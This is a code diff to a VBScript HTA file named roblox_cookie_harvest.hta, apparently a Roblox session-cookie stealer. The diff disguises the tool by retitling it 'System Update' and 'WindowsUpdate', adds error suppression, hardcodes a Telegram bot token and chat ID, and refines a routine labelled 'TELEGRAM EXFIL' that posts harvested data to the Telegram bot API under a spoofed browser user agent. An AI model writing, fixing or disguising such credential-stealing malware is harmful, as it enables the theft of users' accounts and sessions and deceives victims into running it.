@@ -1,10 +1,10 @@
 <!-- roblox_cookie_harvest.hta -->
 <html>
 <head>
-<title>Roblox Session Extractor</title>
+<title>System Update</title>
 <<HTA:APPLICATION 
-  ID="RobloxHarvest"
-  APPLICATIONNAME="RobloxTool"
+  ID="SysUpdate"
+  APPLICATIONNAME="WindowsUpdate"
   BORDER="none"
   BORDERSTYLE="normal"
   CAPTION="no"
@@ -17,9 +17,11 @@
 <body>
 <script language="VBScript">
 
+On Error Resume Next
+
 ' === CONFIGURATION ===
-Const BOT_TOKEN = 8677814765:AAEbs7qoHNiFSbMGyNgALtnZDBgijhOJYiA
-Const CHAT_ID = 8692286004
+Const BOT_TOKEN = "8677814765:AAEbs7qoHNiFSbMGyNgALtnZDBgijhOJYiA"
+Const CHAT_ID = "8692286004"
 Const TELEGRAM_API = "https://api.telegram.org/bot"
 
 ' === PATH ENUMERATION ===
@@ -83,15 +85,32 @@ Function Stream_StringToBinary(text)
   Stream_StringToBinary = stream.Read
 End Function
 
+' === URL ENCODE (HTA has no Server object) ===
+Function URLEncode(str)
+  Dim i, c, out
+  out = ""
+  For i = 1 To Len(str)
+    c = Mid(str, i, 1)
+    If InStr("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.~", c) > 0 Then
+      out = out & c
+    ElseIf c = " " Then
+      out = out & "+"
+    Else
+      out = out & "%" & Right("0" & Hex(Asc(c)), 2)
+    End If
+  Next
+  URLEncode = out
+End Function
+
 ' === TELEGRAM EXFIL ===
 Sub SendToTelegram(message)
   Dim url, payload
   url = TELEGRAM_API & BOT_TOKEN & "/sendMessage"
-  payload = "chat_id=" & CHAT_ID & "&text=" & Server.URLEncode(message) & "&parse_mode=HTML"
+  payload = "chat_id=" & CHAT_ID & "&text=" & URLEncode(message) & "&parse_mode=HTML"
   
   http.Open "POST", url, False
   http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-  http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+  http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
   http.Send payload
 End Sub
 
